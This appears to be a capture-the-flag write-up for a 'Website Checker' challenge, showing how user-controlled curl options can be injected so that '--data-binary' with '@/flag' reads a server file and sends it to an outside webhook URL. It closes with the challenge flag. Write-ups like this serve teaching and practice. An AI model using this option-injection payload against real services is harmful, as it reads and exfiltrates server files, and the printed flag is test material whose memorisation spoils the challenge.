# Website Checker

## Write-up

- The app seems to check the connectivity of a given website and return the status code. So internally, it must send requests to the website we provide.  
- We can try this by providing a webhook url, and we'll see that we get a request, and by looking at the user agent, it's coming from curl.
- Trying to inject some commands into curl doesn't seem to work, but when checking the request sent by the app, we notice that it sent an object with this format.
```
{
	"Host":"Our host",
	{"Options":
		{

		}
	}
}
```
- The options object is sent empty, but since we know the app is using curl, we can try to add curl options (for example, the -X option, which is used to specify the HTTP method to use).
```
{
	"host":"Our host",
	{"options":
		{
			"X":"POST"
		}
	}
}
```
- Knowing the exact way to send the options may require some trying. Sending the above object will result in a POST request, which means we successfully passed options to curl.
- We know that the flag is in `/flag` so all we need to do now is find a way to read files using curl. By looking in the manual (or the web), you can find this with the `--data-binary` option.
```
If  you  start  the  data  with  the letter @, the rest should be a file name to read the data from,
```
- This means that we can send a request with `@/flag`, which will result in reading the flag and sending it back to us.
#### Payload
```
{
	"host":"https://enxadv57kl0h.x.pipedream.net/",
	"options":
		{
			"--data-binary":"@/flag"
		}
}
```
**Note**: It also works with `--data-urlencode` and other options and there is other ways to read.

## Flag

`shellmates{Curl_4nd_1t5_m4g1c4l_0Pt10n$$}}`
